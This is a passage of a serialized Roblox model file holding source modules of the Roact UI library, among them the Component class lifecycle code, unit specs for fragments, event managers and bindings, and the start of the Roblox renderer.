Component.__index = Component
Component.__componentName = "Component"

--[[
	A method called by consumers of Roact to create a new component class.
	Components can not be extended beyond this point, with the exception of
	PureComponent.
]]
function Component:extend(name)
	if config.typeChecks then
		assert(Type.of(self) == Type.StatefulComponentClass, "Invalid `self` argument to `extend`.")
		assert(typeof(name) == "string", "Component class name must be a string")
	end

	local class = {}

	for key, value in pairs(self) do
		-- Roact opts to make consumers use composition over inheritance, which
		-- lines up with React.
		-- https://reactjs.org/docs/composition-vs-inheritance.html
		if key ~= "extend" then
			class[key] = value
		end
	end

	class[Type] = Type.StatefulComponentClass
	class.__index = class
	class.__componentName = name

	setmetatable(class, componentClassMetatable)

	return class
end

function Component:__getDerivedState(incomingProps, incomingState)
	if config.internalTypeChecks then
		internalAssert(Type.of(self) == Type.StatefulComponentInstance, "Invalid use of `__getDerivedState`")
	end

	local internalData = self[InternalData]
	local componentClass = internalData.componentClass

	if componentClass.getDerivedStateFromProps ~= nil then
		local derivedState = componentClass.getDerivedStateFromProps(incomingProps, incomingState)

		if derivedState ~= nil then
			if config.typeChecks then
				assert(typeof(derivedState) == "table", "getDerivedStateFromProps must return a table!")
			end

			return derivedState
		end
	end

	return nil
end

function Component:setState(mapState)
	if config.typeChecks then
		assert(Type.of(self) == Type.StatefulComponentInstance, "Invalid `self` argument to `extend`.")
	end

	local internalData = self[InternalData]
	local lifecyclePhase = internalData.lifecyclePhase

	--[[
		When preparing to update, rendering, or unmounting, it is not safe
		to call `setState` as it will interfere with in-flight updates. It's
		also disallowed during unmounting
	]]
	if lifecyclePhase == ComponentLifecyclePhase.ShouldUpdate or
		lifecyclePhase == ComponentLifecyclePhase.WillUpdate or
		lifecyclePhase == ComponentLifecyclePhase.Render or
		lifecyclePhase == ComponentLifecyclePhase.WillUnmount
	then
		local messageTemplate = invalidSetStateMessages[internalData.lifecyclePhase]

		local message = messageTemplate:format(tostring(internalData.componentClass))

		error(message, 2)
	end

	local pendingState = internalData.pendingState

	local partialState
	if typeof(mapState) == "function" then
		partialState = mapState(pendingState or self.state, self.props)

		-- Abort the state update if the given state updater function returns nil
		if partialState == nil then
			return
		end
	elseif typeof(mapState) == "table" then
		partialState = mapState
	else
		error("Invalid argument to setState, expected function or table", 2)
	end

	local newState
	if pendingState ~= nil then
		newState = assign(pendingState, partialState)
	else
		newState = assign({}, self.state, partialState)
	end

	if lifecyclePhase == ComponentLifecyclePhase.Init then
		-- If `setState` is called in `init`, we can skip triggering an update!
		local derivedState = self:__getDerivedState(self.props, newState)
		self.state = assign(newState, derivedState)

	elseif lifecyclePhase == ComponentLifecyclePhase.DidMount or
		lifecyclePhase == ComponentLifecyclePhase.DidUpdate or
		lifecyclePhase == ComponentLifecyclePhase.ReconcileChildren
	then
		--[[
			During certain phases of the component lifecycle, it's acceptable to
			allow `setState` but defer the update until we're done with ones in flight.
			We do this by collapsing it into any pending updates we have.
		]]
		local derivedState = self:__getDerivedState(self.props, newState)
		internalData.pendingState = assign(newState, derivedState)

	elseif lifecyclePhase == ComponentLifecyclePhase.Idle then
		-- Outside of our lifecycle, the state update is safe to make immediately
		self:__update(nil, newState)

	else
		local messageTemplate = invalidSetStateMessages.default

		local message = messageTemplate:format(tostring(internalData.componentClass))

		error(message, 2)
	end
end

--[[
	Returns the stack trace of where the element was created that this component
	instance's properties are based on.

	Intended to be used primarily by diagnostic tools.
]]
function Component:getElementTraceback()
	return self[InternalData].virtualNode.currentElement.source
end

--[[
	Returns a snapshot of this component given the current props and state. Must
	be overridden by consumers of Roact and should be a pure function with
	regards to props and state.

	TODO (#199): Accept props and state as arguments.
]]
function Component:render()
	local internalData = self[InternalData]

	local message = componentMissingRenderMessage:format(
		tostring(internalData.componentClass)
	)

	error(message, 0)
end

--[[
	Retrieves the context value corresponding to the given key. Can return nil
	if a requested context key is not present
]]
function Component:__getContext(key)
	if config.internalTypeChecks then
		internalAssert(Type.of(self) == Type.StatefulComponentInstance, "Invalid use of `__getContext`")
		internalAssert(key ~= nil, "Context key cannot be nil")
	end

	local virtualNode = self[InternalData].virtualNode
	local context = virtualNode.context

	return context[key]
end

--[[
	Adds a new context entry to this component's context table (which will be
	passed down to child components).
]]
function Component:__addContext(key, value)
	if config.internalTypeChecks then
		internalAssert(Type.of(self) == Type.StatefulComponentInstance, "Invalid use of `__addContext`")
	end
	local virtualNode = self[InternalData].virtualNode

	-- Make sure we store a reference to the component's original, unmodified
	-- context the virtual node. In the reconciler, we'll restore the original
	-- context if we need to replace the node (this happens when a node gets
	-- re-rendered as a different component)
	if virtualNode.originalContext == nil then
		virtualNode.originalContext = virtualNode.context
	end

	-- Build a new context table on top of the existing one, then apply it to
	-- our virtualNode
	local existing = virtualNode.context
	virtualNode.context = assign({}, existing, { [key] = value })
end

--[[
	Performs property validation if the static method validateProps is declared.
	validateProps should follow assert's expected arguments:
	(false, message: string) | true. The function may return a message in the
	true case; it will be ignored. If this fails, the function will throw the
	error.
]]
function Component:__validateProps(props)
	if not config.propValidation then
		return
	end

	local validator = self[InternalData].componentClass.validateProps

	if validator == nil then
		return
	end

	if typeof(validator) ~= "function" then
		error(("validateProps must be a function, but it is a %s.\nCheck the definition of the component %q."):format(
			typeof(validator),
			self.__componentName
		))
	end

	local success, failureReason = validator(props)

	if not success then
		failureReason = failureReason or "<Validator function did not supply a message>"
		error(("Property validation failed: %s\n\n%s"):format(
			tostring(failureReason),
			self:getElementTraceback() or "<enable element tracebacks>"),
		0)
	end
end

--[[
	An internal method used by the reconciler to construct a new component
	instance and attach it to the given virtualNode.
]]
function Component:__mount(reconciler, virtualNode)
	if config.internalTypeChecks then
		internalAssert(Type.of(self) == Type.StatefulComponentClass, "Invalid use of `__mount`")
		internalAssert(Type.of(virtualNode) == Type.VirtualNode, "Expected arg #2 to be of type VirtualNode")
	end

	local currentElement = virtualNode.currentElement
	local hostParent = virtualNode.hostParent

	-- Contains all the information that we want to keep from consumers of
	-- Roact, or even other parts of the codebase like the reconciler.
	local internalData = {
		reconciler = reconciler,
		virtualNode = virtualNode,
		componentClass = self,
		lifecyclePhase = ComponentLifecyclePhase.Init,
	}

	local instance = {
		[Type] = Type.StatefulComponentInstance,
		[InternalData] = internalData,
	}

	setmetatable(instance, self)

	virtualNode.instance = instance

	local props = currentElement.props

	if self.defaultProps ~= nil then
		props = assign({}, self.defaultProps, props)
	end

	instance:__validateProps(props)

	instance.props = props

	local newContext = assign({}, virtualNode.legacyContext)
	instance._context = newContext

	instance.state = assign({}, instance:__getDerivedState(instance.props, {}))

	if instance.init ~= nil then
		instance:init(instance.props)
		assign(instance.state, instance:__getDerivedState(instance.props, instance.state))
	end

	-- It's possible for init() to redefine _context!
	virtualNode.legacyContext = instance._context

	internalData.lifecyclePhase = ComponentLifecyclePhase.Render
	local renderResult = instance:render()

	internalData.lifecyclePhase = ComponentLifecyclePhase.ReconcileChildren
	reconciler.updateVirtualNodeWithRenderResult(virtualNode, hostParent, renderResult)

	if instance.didMount ~= nil then
		internalData.lifecyclePhase = ComponentLifecyclePhase.DidMount
		instance:didMount()
	end

	if internalData.pendingState ~= nil then
		-- __update will handle pendingState, so we don't pass any new element or state
		instance:__update(nil, nil)
	end

	internalData.lifecyclePhase = ComponentLifecyclePhase.Idle
end

--[[
	Internal method used by the reconciler to clean up any resources held by
	this component instance.
]]
function Component:__unmount()
	if config.internalTypeChecks then
		internalAssert(Type.of(self) == Type.StatefulComponentInstance, "Invalid use of `__unmount`")
	end

	local internalData = self[InternalData]
	local virtualNode = internalData.virtualNode
	local reconciler = internalData.reconciler

	if self.willUnmount ~= nil then
		internalData.lifecyclePhase = ComponentLifecyclePhase.WillUnmount
		self:willUnmount()
	end

	for _, childNode in pairs(virtualNode.children) do
		reconciler.unmountVirtualNode(childNode)
	end
end

--[[
	Internal method used by setState (to trigger updates based on state) and by
	the reconciler (to trigger updates based on props)

	Returns true if the update was completed, false if it was cancelled by shouldUpdate
]]
function Component:__update(updatedElement, updatedState)
	if config.internalTypeChecks then
		internalAssert(Type.of(self) == Type.StatefulComponentInstance, "Invalid use of `__update`")
		internalAssert(
			Type.of(updatedElement) == Type.Element or updatedElement == nil,
			"Expected arg #1 to be of type Element or nil"
		)
		internalAssert(
			typeof(updatedState) == "table" or updatedState == nil,
			"Expected arg #2 to be of type table or nil"
		)
	end

	local internalData = self[InternalData]
	local componentClass = internalData.componentClass

	local newProps = self.props
	if updatedElement ~= nil then
		newProps = updatedElement.props

		if componentClass.defaultProps ~= nil then
			newProps = assign({}, componentClass.defaultProps, newProps)
		end

		self:__validateProps(newProps)
	end

	local updateCount = 0
	repeat
		local finalState
		local pendingState = nil

		-- Consume any pending state we might have
		if internalData.pendingState ~= nil then
			pendingState = internalData.pendingState
			internalData.pendingState = nil
		end

		-- Consume a standard update to state or props
		if updatedState ~= nil or newProps ~= self.props then
			if pendingState == nil then
				finalState = updatedState or self.state
			else
				finalState = assign(pendingState, updatedState)
			end

			local derivedState = self:__getDerivedState(newProps, finalState)

			if derivedState ~= nil then
				finalState = assign({}, finalState, derivedState)
			end

			updatedState = nil
		else
			finalState = pendingState
		end

		if not self:__resolveUpdate(newProps, finalState) then
			-- If the update was short-circuited, bubble the result up to the caller
			return false
		end

		updateCount = updateCount + 1

		if updateCount > MAX_PENDING_UPDATES then
			error(tooManyUpdatesMessage:format(tostring(internalData.componentClass)), 3)
		end
	until internalData.pendingState == nil

	return true
end

--[[
	Internal method used by __update to apply new props and state

	Returns true if the update was completed, false if it was cancelled by shouldUpdate
]]
function Component:__resolveUpdate(incomingProps, incomingState)
	if config.internalTypeChecks then
		internalAssert(Type.of(self) == Type.StatefulComponentInstance, "Invalid use of `__resolveUpdate`")
	end

	local internalData = self[InternalData]
	local virtualNode = internalData.virtualNode
	local reconciler = internalData.reconciler

	local oldProps = self.props
	local oldState = self.state

	if incomingProps == nil then
		incomingProps = oldProps
	end
	if incomingState == nil then
		incomingState = oldState
	end

	if self.shouldUpdate ~= nil then
		internalData.lifecyclePhase = ComponentLifecyclePhase.ShouldUpdate
		local continueWithUpdate = self:shouldUpdate(incomingProps, incomingState)

		if not continueWithUpdate then
			internalData.lifecyclePhase = ComponentLifecyclePhase.Idle
			return false
		end
	end

	if self.willUpdate ~= nil then
		internalData.lifecyclePhase = ComponentLifecyclePhase.WillUpdate
		self:willUpdate(incomingProps, incomingState)
	end

	internalData.lifecyclePhase = ComponentLifecyclePhase.Render

	self.props = incomingProps
	self.state = incomingState

	local renderResult = virtualNode.instance:render()

	internalData.lifecyclePhase = ComponentLifecyclePhase.ReconcileChildren
	reconciler.updateVirtualNodeWithRenderResult(virtualNode, virtualNode.hostParent, renderResult)

	if self.didUpdate ~= nil then
		internalData.lifecyclePhase = ComponentLifecyclePhase.DidUpdate
		self:didUpdate(oldProps, oldState)
	end

	internalData.lifecyclePhase = ComponentLifecyclePhase.Idle
	return true
end

return Component]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX9C72C88DD7774C0EB691D6966692201C">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createFragment.spec</string>
					<string name="ScriptGuid">{1F4619D1-7C36-4D85-82AD-714C1DAD5786}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local ElementKind = require(script.Parent.ElementKind)
	local Type = require(script.Parent.Type)

	local createFragment = require(script.Parent.createFragment)

	it("should create new primitive elements", function()
		local fragment = createFragment({})

		expect(fragment).to.be.ok()
		expect(Type.of(fragment)).to.equal(Type.Element)
		expect(ElementKind.of(fragment)).to.equal(ElementKind.Fragment)
	end)

	it("should accept children", function()
		local subFragment = createFragment({})
		local fragment = createFragment({key = subFragment})

		expect(fragment.elements.key).to.equal(subFragment)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX094897B9066745D6ABEAA0197E592AF1">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">SingleEventManager.spec</string>
					<string name="ScriptGuid">{6FE7C2B9-EBD4-4F4E-AD82-7E269ECFB3BF}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.assertDeepEqual)
	local createSpy = require(script.Parent.createSpy)
	local Logging = require(script.Parent.Logging)

	local SingleEventManager = require(script.Parent.SingleEventManager)

	describe("new", function()
		it("should create a SingleEventManager", function()
			local manager = SingleEventManager.new()

			expect(manager).to.be.ok()
		end)
	end)

	describe("connectEvent", function()
		it("should connect to events", function()
			local instance = Instance.new("BindableEvent")
			local manager = SingleEventManager.new(instance)
			local eventSpy = createSpy()

			manager:connectEvent("Event", eventSpy.value)
			manager:resume()

			instance:Fire("foo")
			expect(eventSpy.callCount).to.equal(1)
			eventSpy:assertCalledWith(instance, "foo")

			instance:Fire("bar")
			expect(eventSpy.callCount).to.equal(2)
			eventSpy:assertCalledWith(instance, "bar")

			manager:connectEvent("Event", nil)

			instance:Fire("baz")
			expect(eventSpy.callCount).to.equal(2)
		end)

		it("should drop events until resumed initially", function()
			local instance = Instance.new("BindableEvent")
			local manager = SingleEventManager.new(instance)
			local eventSpy = createSpy()

			manager:connectEvent("Event", eventSpy.value)

			instance:Fire("foo")
			expect(eventSpy.callCount).to.equal(0)

			manager:resume()

			instance:Fire("bar")
			expect(eventSpy.callCount).to.equal(1)
			eventSpy:assertCalledWith(instance, "bar")
		end)

		it("should invoke suspended events when resumed", function()
			local instance = Instance.new("BindableEvent")
			local manager = SingleEventManager.new(instance)
			local eventSpy = createSpy()

			manager:connectEvent("Event", eventSpy.value)
			manager:resume()

			instance:Fire("foo")
			expect(eventSpy.callCount).to.equal(1)
			eventSpy:assertCalledWith(instance, "foo")

			manager:suspend()

			instance:Fire("bar")
			expect(eventSpy.callCount).to.equal(1)

			manager:resume()
			expect(eventSpy.callCount).to.equal(2)
			eventSpy:assertCalledWith(instance, "bar")
		end)

		it("should invoke events triggered during resumption in the correct order", function()
			local instance = Instance.new("BindableEvent")
			local manager = SingleEventManager.new(instance)

			local recordedValues = {}
			local eventSpy = createSpy(function(_, value)
				table.insert(recordedValues, value)

				if value == 2 then
					instance:Fire(3)
				elseif value == 3 then
					instance:Fire(4)
				end
			end)

			manager:connectEvent("Event", eventSpy.value)
			manager:suspend()

			instance:Fire(1)
			instance:Fire(2)

			manager:resume()
			expect(eventSpy.callCount).to.equal(4)
			assertDeepEqual(recordedValues, {1, 2, 3, 4})
		end)

		it("should not invoke events fired during suspension but disconnected before resumption", function()
			local instance = Instance.new("BindableEvent")
			local manager = SingleEventManager.new(instance)
			local eventSpy = createSpy()

			manager:connectEvent("Event", eventSpy.value)
			manager:suspend()

			instance:Fire(1)

			manager:connectEvent("Event", nil)

			manager:resume()
			expect(eventSpy.callCount).to.equal(0)
		end)

		it("should not yield events through the SingleEventManager when resuming", function()
			local instance = Instance.new("BindableEvent")
			local manager = SingleEventManager.new(instance)

			manager:connectEvent("Event", function()
				coroutine.yield()
			end)

			manager:resume()

			local co = coroutine.create(function()
				instance:Fire(5)
			end)

			assert(coroutine.resume(co))
			expect(coroutine.status(co)).to.equal("dead")

			manager:suspend()
			instance:Fire(5)

			co = coroutine.create(function()
				manager:resume()
			end)

			assert(coroutine.resume(co))
			expect(coroutine.status(co)).to.equal("dead")
		end)

		it("should not throw errors through SingleEventManager when resuming", function()
			local errorText = "Error from SingleEventManager test"

			local instance = Instance.new("BindableEvent")
			local manager = SingleEventManager.new(instance)

			manager:connectEvent("Event", function()
				error(errorText)
			end)

			manager:resume()

			-- If we call instance:Fire() here, the error message will leak to
			-- the console since the thread's resumption will be handled by
			-- Roblox's scheduler.

			manager:suspend()
			instance:Fire(5)

			local logInfo = Logging.capture(function()
				manager:resume()
			end)

			expect(#logInfo.errors).to.equal(0)
			expect(#logInfo.warnings).to.equal(1)
			expect(#logInfo.infos).to.equal(0)

			expect(logInfo.warnings[1]:find(errorText)).to.be.ok()
		end)

		it("should not overflow with events if manager:resume() is invoked when resuming a suspended event", function()
			local instance = Instance.new("BindableEvent")
			local manager = SingleEventManager.new(instance)

			-- This connection emulates what happens if reconciliation is
			-- triggered again in response to reconciliation. Without
			-- appropriate guards, the inner resume() call will process the
			-- Fire(1) event again, causing a nasty stack overflow.
			local eventSpy = createSpy(function(_, value)
				if value == 1 then
					manager:suspend()
					instance:Fire(2)
					manager:resume()
				end
			end)

			manager:connectEvent("Event", eventSpy.value)

			manager:suspend()
			instance:Fire(1)
			manager:resume()

			expect(eventSpy.callCount).to.equal(2)
		end)
	end)

	describe("connectPropertyChange", function()
		-- Since property changes utilize the same mechanisms as other events,
		-- the tests here are slimmed down to reduce redundancy.

		it("should connect to property changes", function()
			local instance = Instance.new("Folder")
			local manager = SingleEventManager.new(instance)
			local eventSpy = createSpy()

			manager:connectPropertyChange("Name", eventSpy.value)
			manager:resume()

			instance.Name = "foo"
			expect(eventSpy.callCount).to.equal(1)
			eventSpy:assertCalledWith(instance)

			instance.Name = "bar"
			expect(eventSpy.callCount).to.equal(2)
			eventSpy:assertCalledWith(instance)

			manager:connectPropertyChange("Name")

			instance.Name = "baz"
			expect(eventSpy.callCount).to.equal(2)
		end)

		it("should throw an error if the property is invalid", function()
			local instance = Instance.new("Folder")
			local manager = SingleEventManager.new(instance)

			expect(function()
				manager:connectPropertyChange("foo", function() end)
			end).to.throw()
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX419FB1B79D4B4494A6F66999F626E214">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">internalAssert</string>
					<string name="ScriptGuid">{07676D79-6551-4D43-A18E-BC1DACD70C51}</string>
					<ProtectedString name="Source"><![CDATA[local function internalAssert(condition, message)
	if not condition then
		error(message .. " (This is probably a bug in Roact!)", 3)
	end
end

return internalAssert]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX81AB70D28C2943E7AB94B1A259D8C59C">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Binding.spec</string>
					<string name="ScriptGuid">{30497BE1-CBEA-40A0-AB84-BA1A8805B052}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local createSpy = require(script.Parent.createSpy)
	local Type = require(script.Parent.Type)
	local GlobalConfig = require(script.Parent.GlobalConfig)

	local Binding = require(script.Parent.Binding)

	describe("Binding.create", function()
		it("should return a Binding object and an update function", function()
			local binding, update = Binding.create(1)

			expect(Type.of(binding)).to.equal(Type.Binding)
			expect(typeof(update)).to.equal("function")
		end)

		it("should support tostring on bindings", function()
			local binding, update = Binding.create(1)
			expect(tostring(binding)).to.equal("RoactBinding(1)")

			update("foo")
			expect(tostring(binding)).to.equal("RoactBinding(foo)")
		end)
	end)

	describe("Binding object", function()
		it("should provide a getter and setter", function()
			local binding, update = Binding.create(1)

			expect(binding:getValue()).to.equal(1)

			update(3)

			expect(binding:getValue()).to.equal(3)
		end)

		it("should let users subscribe and unsubscribe to its updates", function()
			local binding, update = Binding.create(1)

			local spy = createSpy()
			local disconnect = Binding.subscribe(binding, spy.value)

			expect(spy.callCount).to.equal(0)

			update(2)

			expect(spy.callCount).to.equal(1)
			spy:assertCalledWith(2)

			disconnect()
			update(3)

			expect(spy.callCount).to.equal(1)
		end)
	end)

	describe("Mapped bindings", function()
		it("should be composable", function()
			local word, updateWord = Binding.create("hi")

			local wordLength = word:map(string.len)
			local isEvenLength = wordLength:map(function(value)
				return value % 2 == 0
			end)

			expect(word:getValue()).to.equal("hi")
			expect(wordLength:getValue()).to.equal(2)
			expect(isEvenLength:getValue()).to.equal(true)

			updateWord("sup")

			expect(word:getValue()).to.equal("sup")
			expect(wordLength:getValue()).to.equal(3)
			expect(isEvenLength:getValue()).to.equal(false)
		end)

		it("should cascade updates when subscribed", function()
			-- base binding
			local word, updateWord = Binding.create("hi")

			local wordSpy = createSpy()
			local disconnectWord = Binding.subscribe(word, wordSpy.value)

			-- binding -> base binding
			local length = word:map(string.len)

			local lengthSpy = createSpy()
			local disconnectLength = Binding.subscribe(length, lengthSpy.value)

			-- binding -> binding -> base binding
			local isEvenLength = length:map(function(value)
				return value % 2 == 0
			end)

			local isEvenLengthSpy = createSpy()
			local disconnectIsEvenLength = Binding.subscribe(isEvenLength, isEvenLengthSpy.value)

			expect(wordSpy.callCount).to.equal(0)
			expect(lengthSpy.callCount).to.equal(0)
			expect(isEvenLengthSpy.callCount).to.equal(0)

			updateWord("nice")

			expect(wordSpy.callCount).to.equal(1)
			wordSpy:assertCalledWith("nice")

			expect(lengthSpy.callCount).to.equal(1)
			lengthSpy:assertCalledWith(4)

			expect(isEvenLengthSpy.callCount).to.equal(1)
			isEvenLengthSpy:assertCalledWith(true)

			disconnectWord()
			disconnectLength()
			disconnectIsEvenLength()

			updateWord("goodbye")

			expect(wordSpy.callCount).to.equal(1)
			expect(isEvenLengthSpy.callCount).to.equal(1)
			expect(lengthSpy.callCount).to.equal(1)
		end)

		it("should throw when updated directly", function()
			local source = Binding.create(1)
			local mapped = source:map(function(v)
				return v
			end)

			expect(function()
				Binding.update(mapped, 5)
			end).to.throw()
		end)
	end)

	describe("Binding.join", function()
		it("should have getValue", function()
			local binding1 = Binding.create(1)
			local binding2 = Binding.create(2)
			local binding3 = Binding.create(3)

			local joinedBinding = Binding.join({
				binding1,
				binding2,
				foo = binding3,
			})

			local bindingValue = joinedBinding:getValue()
			expect(bindingValue).to.be.a("table")
			expect(bindingValue[1]).to.equal(1)
			expect(bindingValue[2]).to.equal(2)
			expect(bindingValue.foo).to.equal(3)
		end)

		it("should update when any one of the subscribed bindings updates", function()
			local binding1, update1 = Binding.create(1)
			local binding2, update2 = Binding.create(2)
			local binding3, update3 = Binding.create(3)

			local joinedBinding = Binding.join({
				binding1,
				binding2,
				foo = binding3,
			})

			local spy = createSpy()
			Binding.subscribe(joinedBinding, spy.value)

			expect(spy.callCount).to.equal(0)

			update1(3)
			expect(spy.callCount).to.equal(1)

			local args = spy:captureValues("value")
			expect(args.value).to.be.a("table")
			expect(args.value[1]).to.equal(3)
			expect(args.value[2]).to.equal(2)
			expect(args.value["foo"]).to.equal(3)

			update2(4)
			expect(spy.callCount).to.equal(2)

			args = spy:captureValues("value")
			expect(args.value).to.be.a("table")
			expect(args.value[1]).to.equal(3)
			expect(args.value[2]).to.equal(4)
			expect(args.value["foo"]).to.equal(3)

			update3(8)
			expect(spy.callCount).to.equal(3)

			args = spy:captureValues("value")
			expect(args.value).to.be.a("table")
			expect(args.value[1]).to.equal(3)
			expect(args.value[2]).to.equal(4)
			expect(args.value["foo"]).to.equal(8)
		end)

		it("should disconnect from all upstream bindings", function()
			local binding1, update1 = Binding.create(1)
			local binding2, update2 = Binding.create(2)

			local joined = Binding.join({binding1, binding2})

			local spy = createSpy()
			local disconnect = Binding.subscribe(joined, spy.value)

			expect(spy.callCount).to.equal(0)

			update1(3)
			expect(spy.callCount).to.equal(1)

			update2(3)
			expect(spy.callCount).to.equal(2)

			disconnect()
			update1(4)
			expect(spy.callCount).to.equal(2)

			update2(2)
			expect(spy.callCount).to.equal(2)

			local value = joined:getValue()
			expect(value[1]).to.equal(4)
			expect(value[2]).to.equal(2)
		end)

		it("should be okay with calling disconnect multiple times", function()
			local joined = Binding.join({})

			local disconnect = Binding.subscribe(joined, function() end)

			disconnect()
			disconnect()
		end)

		it("should throw if updated directly", function()
			local joined = Binding.join({})

			expect(function()
				Binding.update(joined, 0)
			end)
		end)

		it("should throw when a non-table value is passed", function()
			GlobalConfig.scoped({
				typeChecks = true,
			}, function()
				expect(function()
					Binding.join("hi")
				end).to.throw()
			end)
		end)

		it("should throw when a non-binding value is passed via table", function()
			GlobalConfig.scoped({
				typeChecks = true,
			}, function()
				expect(function()
					local binding = Binding.create(123)

					Binding.join({
						binding,
						"abcde",
					})
				end).to.throw()
			end)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX5CB15B354EFD46C3A7CF0E035600F0D3">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ElementKind</string>
					<string name="ScriptGuid">{719BB847-D00D-4A37-8188-D25584449798}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Contains markers for annotating the type of an element.

	Use `ElementKind` as a key, and values from it as the value.

		local element = {
			[ElementKind] = ElementKind.Host,
		}
]]

local Symbol = require(script.Parent.Symbol)
local strict = require(script.Parent.strict)
local Portal = require(script.Parent.Portal)

local ElementKind = newproxy(true)

local ElementKindInternal = {
	Portal = Symbol.named("Portal"),
	Host = Symbol.named("Host"),
	Function = Symbol.named("Function"),
	Stateful = Symbol.named("Stateful"),
	Fragment = Symbol.named("Fragment"),
}

function ElementKindInternal.of(value)
	if typeof(value) ~= "table" then
		return nil
	end

	return value[ElementKind]
end

local componentTypesToKinds = {
	["string"] = ElementKindInternal.Host,
	["function"] = ElementKindInternal.Function,
	["table"] = ElementKindInternal.Stateful,
}

function ElementKindInternal.fromComponent(component)
	if component == Portal then
		return ElementKind.Portal
	else
		return componentTypesToKinds[typeof(component)]
	end
end

getmetatable(ElementKind).__index = ElementKindInternal

strict(ElementKindInternal, "ElementKind")

return ElementKind]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX2BF6622640E5427D9C76DAB272B7AF34">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">RobloxRenderer</string>
					<string name="ScriptGuid">{FB3014AB-E409-4EE2-9B23-989DFA632CA6}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Renderer that deals in terms of Roblox Instances. This is the most
	well-supported renderer after NoopRenderer and is currently the only
	renderer that does anything.
]]

local Binding = require(script.Parent.Binding)
local Children = require(script.Parent.PropMarkers.Children)
local ElementKind = require(script.Parent.ElementKind)
local SingleEventManager = require(script.Parent.SingleEventManager)
local getDefaultInstanceProperty = require(script.Parent.getDefaultInstanceProperty)
local Ref = require(script.Parent.PropMarkers.Ref)
local Type = require(script.Parent.Type)
local internalAssert = require(script.Parent.internalAssert)

local config = require(script.Parent.GlobalConfig).get()

local applyPropsError = [[
Error applying props:
	%s
In element:
%s
]]

local updatePropsError = [[
Error updating props:
	%s
In element:
%s
]]

local function identity(...)
	return ...
end

local function applyRef(ref, newHostObject)
	if ref == nil then
		return
	end

	if typeof(ref) == "function" then
		ref(newHostObject)
	elseif Type.of(ref) == Type.Binding then
		Binding.update(ref, newHostObject)
	else
		-- TODO (#197): Better error message
		error(("Invalid ref: Expected type Binding but got %s"):format(
			typeof(ref)
		))
	end
end

local function setRobloxInstanceProperty(hostObject, key, newValue)
	if newValue == nil then
		local hostClass = hostObject.ClassName
		local _, defaultValue = getDefaultInstanceProperty(hostClass, key)
		newValue = defaultValue
	end

	-- Assign the new value to the object
	hostObject[key] = newValue

	return
end

local function removeBinding(virtualNode, key)
	local disconnect = virtualNode.bindings[key]
	disconnect()
	virtualNode.bindings[key] = nil
end

local function attachBinding(virtualNode, key, newBinding)
	local function updateBoundProperty(newValue)
		local success, errorMessage = xpcall(function()
			setRobloxInstanceProperty(virtualNode.hostObject, key, newValue)
		end, identity)

		if not success then
			local source = virtualNode.currentElement.source

			if source == nil then
				source = "<enable element tracebacks>"
			end

			local fullMessage = updatePropsError:format(errorMessage, source)
			error(fullMessage, 0)
		end
	end

	if virtualNode.bindings == nil then
		virtualNode.bindings = {}
	end

	virtualNode.bindings[key] = Binding.subscribe(newBinding, updateBoundProperty)

	updateBoundProperty(newBinding:getValue())
end

local function detachAllBindings(virtualNode)
	if virtualNode.bindings ~= nil then
		for _, disconnect in pairs(virtualNode.bindings) do
			disconnect()
		end
	end
end

local function applyProp(virtualNode, key, newValue, oldValue)
	if newValue == oldValue then
		return
	end

	if key == Ref or key == Children then
		-- Refs and children are handled in a separate pass
		return
	end

	local internalKeyType = Type.of(key)

	if internalKeyType == Type.HostEvent or internalKeyType == Type.HostChangeEvent then
		if virtualNode.eventManager == nil then
			virtualNode.eventManager = SingleEventManager.new(virtualNode.hostObject)
		end

		local eventName = key.name

		if internalKeyType == Type.HostChangeEvent then
			virtualNode.eventManager:connectPropertyChange(eventName, newValue)
		else
			virtualNode.eventManager:connectEvent(eventName, newValue)
		end

		return
	end

	local newIsBinding = Type.of(newValue) == Type.Binding
	local oldIsBinding = Type.of(oldValue) == Type.Binding

	if oldIsBinding then
		removeBinding(virtualNode, key)
	end

	if newIsBinding then
		attachBinding(virtualNode, key, newValue)
	else
		setRobloxInstanceProperty(virtualNode.hostObject, key, newValue)
	end
end

local function applyProps(virtualNode, props)
	for propKey, value in pairs(props) do
		applyProp(virtualNode, propKey, value, nil)
	end
end

local function updateProps(virtualNode, oldProps, newProps)
	-- Apply props that were added or updated
	for propKey, newValue in pairs(newProps) do
		local oldValue = oldProps[propKey]

		applyProp(virtualNode, propKey, newValue, oldValue)
	end

	-- Clean up props that were removed
	for propKey, oldValue in pairs(oldProps) do
		local newValue = newProps[propKey]

